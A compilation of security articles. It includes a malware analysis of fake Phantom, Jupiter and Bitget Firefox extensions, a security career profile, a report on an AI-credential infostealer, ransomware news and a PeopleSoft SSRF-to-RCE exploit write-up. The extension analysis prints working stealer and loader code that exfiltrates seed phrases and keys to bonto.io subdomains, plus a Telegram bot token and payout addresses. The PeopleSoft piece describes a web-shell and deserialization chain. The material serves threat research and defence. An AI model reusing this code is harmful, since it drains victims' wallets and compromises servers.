Title: Malicious Firefox Extensions Impersonate Phantom, Jupiter, and Bitget to Steal Wallet Secrets
Context: Socket’s Threat Research Team identified a cluster of malicious Firefox extensions that impersonate well-known crypto wallets and steal recovery phrases and private keys
Full Text:
Socket’s Threat Research Team identified a cluster of malicious Firefox extensions that impersonate well-known crypto wallets and steal recovery phrases and private keys. The extensions use Unicode homoglyphs to copy the names of Phantom, Jupiter, and Bitget, and they route stolen secrets to brand-named subdomains of a single command-and-control apex, bonto[.]io. Each signed package carries a complete, always-on stealer, so the malicious code is present in what Mozilla reviewed. The Phantom impersonator adds a second layer: a loader that pulls a stealer from a server at runtime and runs it in the page, letting the operator swap or refresh the payload after review. All three listings were live on Firefox Add-ons during analysis and have been removed as of publication.

The campaign breaks down as follows:

Phantom impersonator (add-on ID 3092199): a small loader inside the signed extension fetches a second-stage stealer from phantom[.]bonto[.]io/config and runs it in the main world of every page the victim opens, and also bundles a stealer and the operator’s drainer backend.

Jupiter and Bitget impersonators (IDs 3092666 and 3092059): the stealer is bundled in the package and routes stolen secrets to jupiter[.]bonto[.]io and bitget[.]bonto[.]io.

Shared infrastructure: at least five brand-named subdomains of bonto[.]io are provisioned as exfiltration hosts, including coinbase[.]bonto[.]io and exodus[.]bonto[.]io, each listing published from its own throwaway AMO (Addons.Mozilla.Org) developer account.

What the Extensions Pretend to Be #

Each listing impersonates a real wallet. The Phantom listing sets its public display name to the string 𝐏ha𝐧†օ𝗺, built from Unicode homoglyphs that render on the page as “Phantom,” and reuses Phantom’s real ghost icon and marketing copy, including the heading “OFFICIAL PHANTOM WALLET (Firefox Update).” The Jupiter listing renders as “Jupiter” and claims to be “Built by Jupiter Exchange.” The Bitget extension’s manifest name is “TabFlow Pro,” while its listing presents Bitget Wallet branding to users.

These are among the most widely used crypto wallets, which is the reputation the campaign trades on. The impersonation is cross-ecosystem: the real Phantom shows 5,000,000 users on the Chrome Web Store and roughly 83,000 daily users on Firefox Add-ons, and these fakes ride that brand recognition.

The Phantom impersonator renders as “Phantom by Phantom” with the genuine ghost icon, and its rating was inflated to 3.9 across 546 reviews at the time of writing.

The extensions request the permissions the theft needs, and the listings declare no data collection. The Phantom impersonator requests access to browser tabs and to data for all websites, and its Permissions and data panel states that the developer says the extension does not require data collection. The developer supplied no privacy policy.

The listing requests access to data for all websites while declaring that it does not require data collection.

How the Theft Works #

A Loader That Fetches a Second Stage

The signed Phantom package carries a benign-looking wallet bundle plus a loader appended to background/serviceWorker.js. The loader rebuilds its C2 host from a character-code array, requests a configuration object, decodes a base64 payload, and runs it as code inside the page. It injects into the main world first, which gives it access to page objects such as the wallet’s own injected provider, and falls back to the isolated content-script world. It re-injects on every tab load and on install and startup.

// loads optional analytics module on first run (function(){ var _c=[112,104,97,110,116,111,109,46,98,111,110,116,111,46,105,111].map(function(n){return String.fromCharCode(n);}).join(''); var _cfg='https://'+_c+'/config'; var _sk='_px'; async function _inj(tabId,src){ // try MAIN world first (works on http/https dapp tabs, gives us window access) // fall back to ISOLATED (works on moz-extension:// own pages, still reads DOM/inputs) try{ await browser.scripting.executeScript({ target:{tabId:tabId}, func:function(c){(0,eval)(c);}, args:[src], world:'MAIN' }); return; }catch(e){} try{ await browser.scripting.executeScript({ target:{tabId:tabId}, func:function(c){(0,eval)(c);}, args:[src] }); }catch(e){} } async function _init(){ try{ var r=await fetch(_cfg,{cache:'no-store'}); var cfg=await r.json(); if(!cfg.active||!cfg.code)return; var src=atob(cfg.code); await browser.storage.local.set({[_sk]:src}); var tabs=await browser.tabs.query({}); for(var i=0;i<tabs.length;i++){ var tab=tabs[i]; if(!tab.id||tab.id<0)continue; await _inj(tab.id,src); } }catch(e){} } browser.tabs.onUpdated.addListener(async function(tabId,info){ if(info.status!=='complete')return; try{ var data=await browser.storage.local.get(_sk); if(!data[_sk])return; await _inj(tabId,data[_sk]); }catch(e){} }); browser.runtime.onInstalled.addListener(function(){setTimeout(_init,2000);}); browser.runtime.onStartup.addListener(function(){setTimeout(_init,2000);}); setTimeout(_init,2000); })();

The character-code array decodes to phantom[.]bonto[.]io, and the comment claiming the code loads an analytics module is the threat actor’s own disguise.

The Server Decides When and What to Steal

The configuration endpoint returns a JSON object with an active flag and a base64 code field. Because the payload is delivered at runtime, the operator controls both whether the stealer runs and what it does, with no new submission to Mozilla. The endpoint can return an inert response during review and the live stealer afterward. At the time of writing, phantom[.]bonto[.]io/config returned active: true and a 4,029-byte payload.

The returned stage is a recovery-phrase and private-key stealer. It classifies captured strings, detecting BIP-39 seed-phrase word counts (12, 15, 18, or 24 words) and both Ethereum (EVM) and Solana private-key formats.

function _isSeedWords(arr){ return (arr.length===12||arr.length===15||arr.length===18||arr.length===24)&&arr.every(function(w){return/^[a-z]{3,8}$/.test(w);}); } function _isKey(s){ if(typeof s!=='string')return false; return/^(0x)?[0-9a-fA-F]{64}$/.test(s.trim())||/^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(s.trim()); }

It captures secrets through several paths: reading every input and textarea value, listening for paste and focusout events, and scanning page text for a numbered recovery-phrase grid of the kind shown on a wallet’s reveal-secret-phrase screen.

var re=/\b\d{1,2}[\.\):\s]\s*([a-z]{3,8})\b/gi;

Because it runs in the main world, it also hooks the page’s injected Solana provider to capture the connected public key.

var _ps=window.phantom&&window.phantom.solana; if(_ps&&_ps.connect){ var _oc=_ps.connect.bind(_ps); _ps.connect=function(o){ return _oc(o).then(function(r){ try{_post({type:'input',data:{solana_pubkey:r&&r.publicKey&&r.publicKey.toString()}});}catch(e){} return r; }); }; }

Captured data is posted as JSON to the C2 host, with an XMLHttpRequest fallback and a simple set to avoid sending the same value twice.

function _post(data){ var k=JSON.stringify(data); if(_sent[k])return; _sent[k]=1; try{fetch(_ep,{method:'POST',headers:{'Content-Type':'application/json'},body:k,keepalive:true}).catch(function(){});} catch(e){try{var x=new XMLHttpRequest();x.open('POST',_ep,true);x.setRequestHeader('Content-Type','application/json');x.send(k);}catch(e2){}} }

The Bundled Variant

The Jupiter and Bitget impersonators do not use a remote loader. Their stealers are bundled in the package and post the captured mnemonic straight to the brand subdomain. The Jupiter impersonator sends the phrase on its “standalone” and “mnemonic” code paths.

case"standalone":case"mnemonic":{fetch("https://jupiter.bonto.io",{method:'POST',headers:{"Content-Type":"application/json"}

The Jupiter impersonator also declares host access to Trezor Connect at connect.trezor.io, which widens the surface it can read. The Bitget impersonator references bitget[.]bonto[.]io in its static/js/hook.js and follows the same bundled pattern.

The Stealer Also Ships In-Package, and Phantom Bundles the Operator's Backend

All three packages ship a complete, always-on stealer inside the signed code Mozilla reviewed, each rated 10 out of 10 by Socket's scanner. Phantom's is analytics.js, wired into its own popup and onboarding pages. Jupiter ships two: a 621 kB trojanized background.js that sends the mnemonic and private key to jupiter[.]bonto[.]io on wallet import, and a smaller hook.js that captures seed phrases and keys from page inputs and the clipboard on any page. Bitget also ships two: static/js/hook.js, which scans page content and extension messages, and static/js/bg-init.js, a background worker that hooks the wallet's own storage to lift the seed as it is decrypted and overrides tab creation to funnel the victim into the local import screen. Both route to bitget[.]bonto[.]io. The remote loader described earlier is Phantom-only, and it gates and refreshes a payload that already ships in the package rather than being the only copy.

Phantom also bundles the operator's own drainer backend as server.js, a Node.js server inside the signed add-on. It logs captured secrets to local files, forwards them to a Telegram bot, and automatically sweeps funds to hardcoded payout addresses across Ethereum, BSC, Polygon, Arbitrum, Optimism, Base, Avalanche, Solana, and Bitcoin. A comment in the file notes the payload reaches the extension only "after approval flip," meaning after Mozilla's review.

The package also ships server-review.js, a stripped server that returns an inactive config during Mozilla's review. After approval the operator switches to the live server.js, the "approval flip" the comment refers to.

const TG_TOKEN = '8834114695:AAGC99--r8KFikBpDw5JCkAteIc4cRi2VTU'; const TG_CHAT = '-5433023573'; const DEST = { evm: '0x93ce11fAA9FC83741e8b392879b383bcc5f7f3Ad', sol: 'GCo8tAh5WjAuH51bnRZtkmKDRuoXHFDNz9MZY25Zuvsr', btc: 'bc1qrsfyjrsel924nny9q0qak5cfyf7pahmsydwnrq', };

Infrastructure and Attribution #

All exfiltration points to subdomains of a single apex, bonto[.]io, fronted by Cloudflare so the origin is hidden. The Phantom host behaves as a second-stage delivery and exfiltration point, while the other brand hosts accept exfiltration POSTs directly. Probing the apex for additional brand subdomains returned provisioned hosts for coinbase[.]bonto[.]io and exodus[.]bonto[.]io, each responding with the same signature as the confirmed Jupiter and Bitget exfiltration hosts, which indicates the campaign also targets the Coinbase Wallet and Exodus brands. Corresponding AMO listings for those two brands were not located at the time of writing.

Each of the three confirmed listings was published from a separate throwaway AMO developer account (anonymous-30b17a249a34fdf5d2be64b3dfcc8494, anonymous-3efb89873d4c425c012cd1cb1736629a, and anonymous-ca2bf8b1ba371a1426c1049d9dad8168), a pattern that spreads the campaign across accounts and slows bulk takedown.

The Phantom and Jupiter packages also ship a CLAUDE.md file the extension never loads at runtime. It is an AI-assistant jailbreak prompt, which points to AI-assisted malware authoring and an attempt to subvert AI-assisted review.

Impact #

When a victim installs one of these extensions and enters or reveals a recovery phrase, or pastes a private key, the secret is sent to the threat actor. A recovery phrase and a private key are bearer secrets: whoever holds them controls the wallet and can move every asset in it. The main-world injection means the Phantom variant can read secrets both when they are typed during import and when they are shown on a reveal-secret-phrase screen, and it can observe the page’s wallet provider directly.

The Phantom listing shows active rating manipulation. Over roughly two days the review count rose from 275 to 546 and the average rating rose from 2.9 to 3.9, which pushes down the one-star reviews in which users report losing funds. Reported losses in those reviews are self-reported and unverified. Average daily users reported by AMO for each listing were low, between one and three, but the listings were live and the infrastructure was active.

Socket’s AI Scanner flagging the Phantom impersonator as known malware.

Recommendations #

For Users

Install wallet extensions only from the vendor’s official website link, not from store search results. Homoglyph names and copied icons make a fake listing look identical to the real one.

Treat any extension that asks for a recovery phrase or private key outside the real wallet flow as hostile, and never enter a seed phrase into a page you reached from a store listing.

If you entered a seed phrase or private key into one of these extensions, move funds to a new wallet created on a clean device immediately and treat the old wallet as compromised.

For Developers

Pin the exact extension IDs your team uses and review extensions that request access to data for all websites together with tabs or scripting.

Watch for extensions that fetch and execute code at runtime, which is visible as a fetch of a configuration endpoint followed by eval or scripting.executeScript.

For Security Teams

Block the bonto[.]io apex and its subdomains at the network layer and alert on DNS lookups for brand-named subdomains under it.

Hunt for browser extensions whose signed bundle contains a loader that injects into the main world.

Socket’s browser extension protection analyzes extension bundles for hidden data flows, undisclosed credential exfiltration, and C2 backdoors, blocking malicious extensions before they reach user endpoints.

T1176 Browser Extensions

Title: Part 3 – Cybersecurity journeys: The work behind the work
Context: Build the foundation first, often through a role like a security operations center, join the communities where people are learning in the open, and let the flashier work come...
Full Text:
The most important work I’ve done in cybersecurity would make for terrible television. There were no countdown clocks and no frantic typing, just a lot of careful reading, a lot of hard conversations, and the occasional quiet moment where everything finally clicked. That’s the part I want to show you this week, because the three people I talked to have built their entire careers on the work that happens off-camera, and it’s the part that decides who lasts in this field.

This is a four-part series following 11 AWS security professionals through the real stories of how they got here and what the work actually looks like. In Part 1: I didn’t plan this, I shared how three of them found their way in, and in Part 2: What even is this job?, we looked at roles most people don’t know exist. This week is about what the day-to-day actually feels like, told through three AWS security professionals whose work rarely makes it into the trailer but is the reason any of it holds together.

Unlimited ammo

Brandon Caldwell, Mgr, Security Engineering

Ask most people to picture an application security engineer at work and they’ll imagine someone hunched over a terminal breaking into systems. Brandon Caldwell‘s actual days (reviewing software while it’s being built so the flaws never ship) look almost nothing like that. He spends them in conversation: sitting with the engineers who built a product, walking through how it works, and asking question after question until he understands it well enough to see where it could break. “This job is at least 50 percent people,” he tells the folks he hires. “You have to people a lot.”

The hardest part of the day isn’t technical, it’s human. Brandon’s team has to hand builders news they don’t want to hear, and he’s blunt with new hires about what that really feels like.

“Our job is to go tell someone their baby is ugly. I use that phrase because it is meant to draw out empathy. This is the thing they love and spent time on, and you show up at the end and say that thing is ugly. Of course they are going to react.” – Brandon Caldwell

Learning to deliver that message without crushing the person across the table is, in his telling, the actual craft of the job. It’s why he prizes empathy, and why he says the engineers who struggle most in application security are the ones who got into tech specifically to avoid talking to people. The rest of the day is the patient, unglamorous work of reading someone else’s code closely enough to find the one flaw they didn’t know they’d left, then explaining it in a way that lands as help rather than judgment.

That explaining is more than a conversation. So much of security work gets written down: the finding documented so an engineer can act on it, the advisory that tells customers what to do, the policy that sets the bar for everyone who comes after. The ability to write clearly, to turn something messy and technical into a few sentences a reader can actually use, is one of the quiet differentiators as you move up in this field, and it’s a skill worth building long before anyone asks you to.

None of this is where Brandon started. He’s been curious about breaking things since he was a kid hex-editing the game Doom for unlimited ammo, taught himself reverse engineering (taking apart finished software to understand how it works) before it had a name, and spent years as an IT admin and then in incident response at Microsoft back when cybersecurity barely existed as a job title. What pulled him off the breaking side was noticing—after watching the same handful of mistakes scroll past again and again (things like SQL injection and cross-site scripting, two of the most common ways attackers exploit a poorly built website)—that he’d rather help teams avoid the break-in than perform it. Application security, he says, is his natural place.

As for breaking in yourself, Brandon’s advice follows straight from how he spends his days: practice interviewing and asking the right questions and spend real time around builders so you understand what goes into the thing you’re critiquing. When he hires, certifications are the last thing he looks at; he wants to see capture-the-flag competition results (hacking contests where you solve security puzzles to earn points) and public GitHub projects, because those prove you’ve done the work. Build something, break something, and get comfortable talking to the people who build.

Forget that

Kurt Heath, IT Support Associate

Kurt Heath‘s chosen corner of the work is offensive security: penetration testing (getting paid to legally break into systems to prove where they’re weak) and, eventually, red teaming. The day-to-day of getting good at it is far less cinematic than the label suggests. It’s hours of hands-on practice against deliberately vulnerable targets, reading about a technique and then trying it until it works, and the slow accumulation of the layers the job actually rests on: operating systems, networking, software development, and security fundamentals, all applied at once. He’s the first to say pen testing is “the sexy thing” that gets advertised, and the first to warn that it shouldn’t be anyone’s first stop, because of how much quiet groundwork sits underneath it.

A big part of his real workday now is deciding how, and how much, to lean on AI. Kurt treats it as a tool rather than a crutch: he uses it as a coding assistant when he has to work in an unfamiliar language, and to sort through large volumes of information quickly, but he won’t let it think for him. He still fills out forms like this blog’s questionnaire by hand, keeping a personal touch on his own work, and he’s wary of letting AI pull the trigger during an engagement, since an overzealous tool can act on a network however it sees fit, cause unintended operational damage, or wander out of scope and create a legal problem. The way he sees it, security is fundamentally a human problem: automation keeps getting better at the systematic parts, but thinking outside the box the way an attacker does stays stubbornly human.

How Kurt got here matters less to the day-to-day than how he keeps going, but it’s worth knowing that he’s largely self-taught. After a community college program didn’t work out, he taught himself from scratch, finishing shifts at an auto plant and then spending nights with YouTube and a search bar learning how computers and networks actually worked. The hardest part, he told me, was self-motivation, and what carried him through was a mix of sheer want and, eventually, other people: the friends and community he found in Discord servers, security podcasts, and interest channels who helped him turn raw drive into real focus. He even got a tattoo as a reminder that there is no plan B.

“There is no other option. There’s no what if. This is it. This is life now, and I’ll figure it out some way, somehow, no matter how long it takes.” – Kurt Heath

If you’re drawn to the same offensive work, Kurt’s advice is to resist starting there. Build the foundation first, often through a role like a security operations center, join the communities where people are learning in the open, and let the flashier work come after the groundwork is solid. Progress in this field—in his experience—is measured less by the title you land than by how much you grow and who you grow alongside.

The comfort lock

Seth Jeacopello, Mgr, Security Engineer

Seth works in application security too, but if Brandon’s days are mostly about people, Seth’s are mostly about code, which makes the two of them a useful picture of how differently the same job can look. When Seth Jeacopello gets stuck on a hard problem, he doesn’t stare at it harder, he picks up a lock. An actual physical lock with pins and tumblers, because he’s a serious lock-picking hobbyist, and over the years he’s learned that the best response to hitting a wall is to set the problem down and pick what he calls a comfort lock, one he knows well and can open easily. It isn’t about the lock; it’s about giving his brain a small win so he can return to the hard thing with fresh eyes.

The comfort lock exists because Seth’s actual day-to-day is easy to get lost in. In application security, a big part of the job is reading enormous amounts of someone else’s code looking for the one flaw that matters, and as a lifelong developer he genuinely loves reading code, which is exactly what makes it a trap. He described the pull of it to me: you convince yourself the vulnerability is just behind the next function, and the next, and suddenly two days are gone. The skill he’s spent decades sharpening isn’t finding things, it’s knowing when deep enough is deep enough and when to step back, which is where the lock comes in. After 26 years, the meta-skill of managing his own attention is as much a part of the craft as anything technical.

That longevity goes back a long way. Around 1999, still in his teens, he landed a software quality assurance internship, was hired as a developer by 17, and gravitated toward the security-flavored work from the start before moving into network security tooling, rising to chief architect and then chief technology officer along the way.

“We’re like three or four guys off the street coming in with a product, and this huge company was like, yeah, you three, go for it. That was probably one of the coolest things.” – Seth Jeacopello

His advice for building the instincts the daily work demands is refreshingly concrete: set up a deliberately vulnerable practice machine, break into it, and then go read the logs it generated, so you learn not just how an attack works but what it looks like from the defender’s side. That single exercise builds both the offensive and the investigative muscle at once, and it’s the kind of patient, repeatable practice that the day-to-day of this field actually rewards.

The thread

There’s a version of cybersecurity that makes for great television, fast-paced and full of eureka moments, and those moments do exist. But the three people I talked to this week live in a different version of the field, one built on patience, repetition, and a kind of stubborn care that doesn’t photograph well. For Brandon, the real work is the hard, human conversation of telling a builder their work is flawed without making an enemy of them. For Kurt, it’s the unglamorous hours of hands-on practice and the discipline to use AI as a tool without letting it think for him. For Seth, it’s reading one more page of code and knowing when to stop, with a comfort lock on the desk for when he can’t.

None of that makes a great action sequence, but all of it is what a security career actually looks like, and the good news for anyone starting out is that these are learnable habits, not inborn talent. Notice how much of the real work is human: empathy, patience, judgment, and knowing how your own mind works. The analytical, interpersonal, and self-management skills you already have are not a consolation prize, they are part of the job. If you want to begin building the rest, here are a few places to start:

TryHackMe and Hack The Box let you stand up deliberately vulnerable machines, break in, and study what you triggered, exactly the exercise Seth recommends

The OWASP Top 10 explains the most common application security flaws, including the ones Brandon saw on repeat

The OWASP Cheat Sheet Series turns those flaws into practical, task-level guidance on how to build and review software securely; the daily bread of Brandon’s and Seth’s work

The Darknet Diaries podcast tells the human stories behind real security incidents, and it’s a good way to hear what the work actually feels like

And if you want to build cloud security skills specifically, AWS has free and hands-on resources to help you start:

AWS Skill Builder offers more than 1,000 free self-paced courses, including security learning plans you can start today

AWS Builder Labs lets you practice in a real AWS console on hands-on security labs, the stand-it-up-and-try-it approach Seth recommends

In Part 4: What I’d tell myself, we close the series with the advice and hard-won lessons these professionals would hand to someone just starting out.

Doing the work behind the work? These three want you to know it counts. Share your story on LinkedIn!

Shannon Brazil

Shannon is a senior security engineer, managing a team on the AWS Customer Incident Response Team (CIRT), specializing in digital forensics and cloud security investigations. Known in the community as AWSlady, she is passionate about security education and mentoring the next generation of defenders.

Title: 'Aokigahara' Stealer Targets 'Developer Keyrings' & AI Assistants
Context: Researchers from Check Point Software discovered the malware, dubbed Aokigahara after the Japanese "haunted forest" at the base of Mount Fuji, which does typical stealer things,...
Full Text:
A novel infostealer that specifically targets AI applications and development tools is changing the narrative on illicit data monetization, opening up fresh revenue streams through extortion and other abuses of the stolen data.

Researchers from Check Point Software discovered the malware, dubbed Aokigahara after the Japanese "haunted forest" at the base of Mount Fuji, which does typical stealer things, they said in a recent report. It targets Windows-based machines and the browsers, VPN clients, cryptocurrency wallets, FTP/SFTP clients, password managers, and email applications running on them — among other apps and services — with data theft.

However, Aokigahara is notable in that it has a particular focus on emerging AI-driven assets, collecting authentication files, session data, and configuration files associated with Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, and other tools, according to Check Point. This sets it apart from many of the infostealers currently active in the wild.

Related:BeyondTrust Remote Support Zero-Day Continues Trend of Exploited Edge Bugs

"This expanded targeting reflects a broader shift in what attackers may consider valuable, not only personal accounts and financial data but also access to AI services and the environments developers use to build software," according to Check Point.

Different Targets for Cybercrime, Different Financial Opportunities

The AI data offers unique opportunities for threat actors to benefit financially from the stealer's activities by using credentials or session tokens to "enable unauthorized access to paid AI services or the resale of compromised accounts," according to the report.

The malicious activity can also extend to developer and cloud environments, and thus threaten enterprises. Indeed, threat actors have already demonstrated how they use stolen credentials for GitHub accounts, SSH private keys, and AWS, Azure, and Google Cloud credential and configuration files to infiltrate cloud environments of enterprise targets.

This may also pave the way for extortion of organizations by holding stolen data for ransom, according to Check Point.

"Users can share sensitive business information, proprietary source code, and other confidential material with AI services," according to the post. "If stolen credentials or session tokens provide access to conversation histories or uploaded files, attackers could potentially threaten to disclose that information to demand payment."

Denis Calderone, chief technology officer of security firm Suzu Labs, tells Dark Reading that "stolen AI credentials can yield a heavy harvest for an attacker. A paid AI subscription is a resellable asset, and the conversation history behind it is often full of proprietary code, which means these stolen sessions now carry extortion value alongside their resale value."

Related:EDR Evasion Stack Helps Process Injection Slip Past Defenses

Aokigahara Infostealer Malware In Action

Once an Aokigahara infection begins, it scans a computer for sensitive data, including browser passwords, session cookies, cryptocurrency wallets, and credentials stored by AI assistants such as ChatGPT, Claude, Cursor, and GitHub Copilot. It also searches local application files for authentication tokens, API keys, and other potentially valuable information.

Other targeted data the malware looks for are developer and cloud credentials, including Git access data, SSH keys, and configuration files for AWS, Azure, and Google Cloud. This data is valuable to give attackers access to private code repositories or cloud resources if the stolen credentials remain valid and have sufficient permissions, according to Check Point.

Indeed, "a developer's AI assistant is a keyring," Calderone observes, and some of those keys ultimately could give attackers access to the kingdom.

"The same malware that lifts the Cursor or Copilot session is also grabbing Git credentials, SSH private keys, and AWS config files off that workstation, so one infected machine can expose the codebase, the repos, and the cloud in a single run," he says.

Related:BragJack Attack Can Turn a Browser's Agentic AI Against It

Aokigahara also has built-in anti-detection mechanisms. It checks for analysis environments such as virtual machines and sandboxes, and packages stolen data into zip archives and then encrypts it before sending it to attacker-controlled servers.

Modern Defense as Attackers Expand Objectives

Aokigahara's targeting of AI tools expands the traditional infostealer playbook, potentially exposing AI sessions, sensitive business data, and developer infrastructure from a single compromised endpoint. The theft of this data then opens new pathways for financial gain for attackers and thus may provide an incentive for others to do the same, according to Check Point.

This means that defenders should start treating AI-tool authentication data as enterprise secrets, with protections comparable to those applied to cloud credentials and developer keys. To that end, security teams should hunt for AI-session theft by investigating suspicious access to local application storage and authentication-related files belonging to AI assistants, coding agents, and developer IDEs.

Organizations also should more closely protect developer and cloud credentials by reducing the persistence of long-lived secrets on endpoints, using managed identity and short-lived credentials where feasible, and restricting access to cloud resources and source-code repositories.

Further, organizations can protect assets across exposed apps and tools by revoking exposed sessions and rotating secrets. If an endpoint is suspected of compromise, according to Check Point, they should assess AI sessions, API keys, GitHub credentials, SSH keys, and cloud tokens, not just browser passwords.

Title: Cyber Incident Forces UNM Health to Cancel Surgeries, Divert Ambulances
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
The University of New Mexico Health Sciences Center (UNM HSC) has been hit by a cyber incident, which resulted in the cancellation of surgeries and diversion of ambulances.

The medical center disclosed the incident on Monday October 26 at 2.30pm MDT, informing patients that all appointments, including scheduled surgeries, were cancelled for the rest of the day.

“UNM Health patients should not show up to UNM Health facilities on October 26. Emergencies should be handled by 911 and non-emergencies should be delayed until further notice,” the update read.

Clinical Services Resume but Classes Cancelled

A further update posted at 10.27pm on October 26 confirmed that all UNM Health hospitals had reopened, and clinics would resume regularly scheduled appointments and procedures from Tuesday, October 27.

“At 2:30pm, UNM Health began resuming operations and bringing systems back online in phases, as it was safe to do so. We will work with patients to reschedule missed appointments and procedures,” HSC added.

Read now: UK Healthcare Sector Records Tenfold Increase in Cyber-Attacks

All students enrolled at the School of Medicine, College of Pharmacy, College of Nursing, and College of Population Health were told to leave campus on Monday.

As part of its remediation efforts, UNM canceled classes on the Health Sciences campus and sent non-essential employees home.

All classes at the UNM School of Medicine, College of Nursing, College of Pharmacy and College of Population Health were also canceled on Tuesday, October 27, including online and remote classes, while non-essential employees will remain at home.

However, classes at UNM’s Central and branch campuses are not affected.

BYOD Ransomware Claims Attack

No details on the nature of the incident, or potential perpetrators, have been provided at the time of writing.

However, the emerging ransomware group BYOD has reportedly claimed to be behind the incident affecting UNM HSC.

Cybersecurity intelligence firm VenariX revealed on X that the group listed the University of New Mexico on its data leak site, claiming to have compromised 36,000 machines and exfiltrated sensitive data.

This data allegedly includes student and employee personally identifiable information (PII), research data, student records and internal emails.

“This is your entire network and infrastructure compromised, the entire university COMPLETELY,” the group posted on its data leak site.

UNM HSC receives more than one million patient visits every year, made up of around 900,000 outpatient appointments and around 100,000 emergency room visits.

The Center had 2670 students enrolled in its classes in 2025.

Title: CVE-2026-35273: SSRF to RCE in Oracle PeopleSoft
Context: On September 25, 2026, Mandiant released a report regarding continued mass exploitation of CVE-2026-35273 by the ShinyHunters group
Full Text:
On September 25, 2026, Mandiant released a report regarding continued mass exploitation of CVE-2026-35273 by the ShinyHunters group. TrendAI’s Zero Day Initiative first reported this CVE to Oracle on June 10, 2026, following an investigation I conducted with Minh Giang and Lucas Miller of TrendAI Research. Although Oracle issued a patch under a single CVE, we reported three distinct vulnerabilities across multiple PeopleSoft components. We are coordinating with Oracle to assign separate CVEs for each issue.

In this blog post, we will walk through each of these vulnerabilities, starting with a Server-Side Request Forgery (SSRF) vulnerability. We will also review the validateClient method that Oracle introduced to allow PeopleSoft system administrators to restrict access to certain functionality. Spoiler alert: the SSRF allows attackers to make requests that satisfy this validation and access endpoints vulnerable to remote code execution (RCE).

Overview

There are two main components involved here, both served as individual Oracle WebLogic applications.

The first, the PeopleSoft Environment Management Hub (PSEMHUB), is part of Oracle’s Environment Management Framework. This component implements the validateClient method, ensuring only trusted clients can reach PSEMHUB functionality. Because this is an internal management interface, it makes sense that Oracle would restrict access to its web endpoints. However, this also means it’s a prime target for attackers looking to pivot from their existing, low-privileged access.

The second, the PeopleSoft Integration Gateway (PSIGW), contains functionality for exchanging messages between the PeopleSoft server and remote systems. This is accomplished using a set of Listening and Target Connectors.

One such connector is the HttpListeningConnector, which translates data from inbound HTTP requests into the format supported by the specified Target Connector before routing the request to the desired URL. In this chain, attackers specify the HttpTargetConnector.

The diagram below shows how an attacker like ShinyHunters can combine these vulnerabilities to compromise PeopleSoft systems. Notice that the attacker cannot simply hit the PSEMHUB functionality directly:

Bug 1: PSIGW Server-Side Request Forgery (ZDI-CAN-31816)

Now let’s take a look at how the PSIGW SSRF provides attackers with a foothold in the PeopleSoft application. An example malicious request to PSIGW shows just how powerful this is for an attacker. We control the URL to hit AND the full payload to send!

At [1], the attacker sends a POST request to /PSIGW/HttpListeningConnector

At [2], the HttpTargetConnector handler class is specified

At [3], the target is PeopleSoft on the loopback interface at http://127.0.0.1:8000, satisfying the validateClient logic

At [4], the full POST request payload is specified in the Data field, to be forwarded to the target URL at [3]

The HttpTargetConnector handler appears below. Note there is no validation to ensure this traffic is legitimate and bound for a valid target. I've done my best to pull out the important parts of this 800+-line function. If you want a fun side quest, go decompile this for yourself and check it out. I hope you like spaghetti!

At [1], retrieve the target URL from the attacker's request

At [2], create an httpObj using the URL from [1]

At [3], retrieve the HTTP method (POST) and apply it to the httpObj from [2]

At [4], send the content data seen in the Data tag of the network request. This content is sent as-is using the HTTP parameters configured in the httpObj

To fully understand why this SSRF is valuable, here is the validateClient method I mentioned earlier:

At [1] and [2], the validateClient method pulls the hostname and IP of the requesting client

At [3], a file path is built to the /envmetadata/config/allowedhosts.properties file, which contains the list of hosts allowed to access functionality protected by validateClient

At [4], the server checks if the allowedList set contains any entries. The first time this path is hit, the set is empty, so execution continues into the client list refresh block

At [5], that allowedhosts.properties file is read and iterated over

At [6] and [7], each allowed host is added to the allowedList set, including the default localhost entry alongside the server's resolved hostname and IP address

At [8] and [9], if the requesting host is found in the allowedList set, validateClient returns true

We can see the localhost entry in the default allowedhosts.properties that ships with PeopleSoft:

While this solution does restrict access, an attacker on any trusted host can still reach PSEMHUB. Because Oracle allows localhost by default, the PSIGW SSRF provides exactly that access.

Bug 2: PSEMHUB External Control of File Path (ZDI-CAN-31818)

Now that the attacker can make requests to the PSEMHUB endpoints using the PSIGW SSRF, let's see how they can turn that into RCE.

The first path to code execution uses an External Control of File Path vulnerability in the ExecuteProcessActivityCommand handler, which is designed to allow remote clients to write log entries to the PeopleSoft server’s filesystem.

However, callers of the command control both the file contents AND the absolute file path on disk to which that content is written. Here’s an example of the request made to PSEMHUB. Note that, in practice, each parameter value is a form-encoded serialized Java object. For clarity, I’ve decoded and formatted it here:

At [1], we see the request is being made to PSEMHUB’s central routing hub

At [2], note that the request is made to the loopback address 127.0.0.1. Since this request originates from localhost, the validateClient check is satisfied

At [3], the web shell contents are specified in the m_line parameter

At [4], the absolute path where the contents will be written is specified in the m_targetFile parameter

Looking at the handler for this request, we can see that no validation is performed to ensure that m_targetFile points to a legitimate log directory:

By writing this shell to the PSEMHUB WAR path, the attacker achieves immediate remote code execution in the context of the PeopleSoft service account.

Here's how those bugs look when chained together:

Bug 3: PSEMHUB Deserialization of Untrusted Data (ZDI-CAN-31817)

Using any file write primitive (like the ExecuteProcessActivityCommand seen above), an attacker can write a malicious XML file inside the [docroot]/envmetadata/data/environment/ directory. When the PSEMHUB HubServlet class initializes next (after a system or service restart, for example), it triggers a code flow that ultimately deserializes this XML file. Because this vector does not require writing a JSP web shell, it is less likely to be noticed by standard detection methods.

Specifically, on initialization, the PSEMHUB HubServlet class calls startServerPeer in the com.peoplesoft.pt.environmentmanagement.hub.Server class:

At [1], HubMBeanPersistance.getInstance() is called, which triggers the private constructor for that class

At [2], env_dir_path is set to <context_root>/envmetadata/data/environment/, which contains the malicious XML file placed by the attacker

At [3], all files from this folder are loaded into a list variable fl

At [4] and [5], the absolute path for each file in that directory is built

At [6], XMLDecoder is instantiated for each file

At [7], the content of the malicious XML placed by the attacker is deserialized

Java's XMLDecoder instantiates and configures the objects described in the XML during parsing, so the attacker's payload executes before the cast to Environment throws an exception.

Conclusion

